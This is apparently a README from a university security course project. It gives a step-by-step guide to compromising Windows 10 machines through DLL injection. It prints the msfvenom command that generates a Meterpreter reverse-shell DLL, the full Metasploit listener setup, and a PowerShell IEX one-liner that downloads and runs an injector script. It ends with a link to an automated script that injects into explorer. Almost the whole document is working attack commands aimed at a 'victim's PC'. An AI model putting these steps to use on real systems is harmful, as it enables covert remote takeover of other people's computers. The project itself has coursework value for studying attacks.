
# Security of Systems and Networks - Final Project

This is a Project made for the curricular unit Security of Systems and Networks.

Our final project consists in a system attack that targets Windows 10 machines. 
It consists in a DLL injection of a malicious DLL containing a payload from Metasploit. The payload used was Meterpreter to implement a reverse shell to the infected computer.






## Attack Guide
### Creation of the DLL and setup of the listener

Open Kali Linux terminal and type the following command:

```
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<SOME_PORT> -f dll > <OUTPUT_PATH> 
```

Once the DLL is created in the output path specified, copy it to a USB storage device.

After that, we need to setup the listener. Firstly, open the Metasploit Framwork console by typing the command:

```
  msfconsole
```
Once it opens, select usage of "exploit/multi/handler" module:

```
  use exploit/multi/handler
```

Then, set the payload used to create the DLL file:

```
  set payload windows/x64/meterpreter/reverse_tcp
```

Now set your IP:

```
  set lhost <YOUR_IP>
```

And the port specified previously:

```
  set lport <SOME_PORT>
```

Finally to start listening just execute:

```
  exploit
```

As soon as the victim's machine has the DLL injected the connection will establish and you should see something like this.

![App Screenshot](https://raw.githubusercontent.com/GVO72/SSR_FP/main/Images/listener_established_conn.png)

### DLL injection in victims PC - Manually

Insert the USB storage device and open Powershell.

Now run the command below, select a process where you will inject the DLL and anotate its pid.

```
  ps
```

After that, enable TLS 1.2 with the command:

```
  [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
```

Download the injector provided in this repository:

```
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GVO72/SSR_FP/main/Invoke-DllInjection.ps1')
```

And finally inject the malicious DLL with the command:

```
  Invoke-DllInjection -ProcessID <selected_pid> -Dll <path_of_the_dll>
```

If everything works as expected you should see something like this.

![App Screenshot](https://raw.githubusercontent.com/GVO72/SSR_FP/main/Images/ps_comands.png)

### DLL injection in victims PC - Script automated

If the victim's machines allows Powershell scripts to be executed you can simply download our script that does the the injection commands for you. Basically it searches for the pid of "explorer" and injects the DLL that he presumes to be in D:\ and is named "inject.dll". You can change the path to your DLL's name and path.

Download the script here: https://github.com/GVO72/SSR_FP/releases/download/v1.0/inject.ps1